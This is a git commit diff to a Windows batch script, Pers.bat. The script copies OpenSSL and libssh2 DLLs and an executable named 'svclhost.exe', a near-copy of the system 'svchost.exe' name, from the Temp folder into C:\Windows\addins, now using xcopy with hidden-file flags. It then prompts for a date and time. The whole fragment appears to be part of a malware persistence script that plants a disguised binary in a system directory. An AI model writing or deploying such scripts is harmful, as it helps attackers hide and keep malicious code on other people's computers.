f2fc03f0baa86969d0f4118c3b433082c803bfc0
NoManCan <tiger_man_student@yahoo.com>
2025-03-30 23:24:19 +0400

    Update Pers.bat

--- Pers.bat
+++ Pers.bat
@@ -1,10 +1,10 @@
 @echo off
 cd "C:\Windows\addins"
 
-copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\addins\libcrypto-3.dll"
-copy /y "C:\Windows\Temp\libssh2.dll" "C:\Windows\addins\libssh2.dll"
-copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\addins\libssl-3.dll"
-copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\addins\svclhost.exe"
+xcopy "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\addins\libcrypto-3.dll"  /h /i /c /k /e /r /y
+xcopy "C:\Windows\Temp\libssh2.dll" "C:\Windows\addins\libssh2.dll"  /h /i /c /k /e /r /y
+xcopy "C:\Windows\Temp\libssl-3.dll" "C:\Windows\addins\libssl-3.dll"  /h /i /c /k /e /r /y
+xcopy "C:\Windows\Temp\svclhost.exe" "C:\Windows\addins\svclhost.exe"  /h /i /c /k /e /r /y
 
 set /P n_date=Enter Required Date (MM/DD/YYYY): 
 set /P n_time=Enter Required Time (HH:MM:SS): 
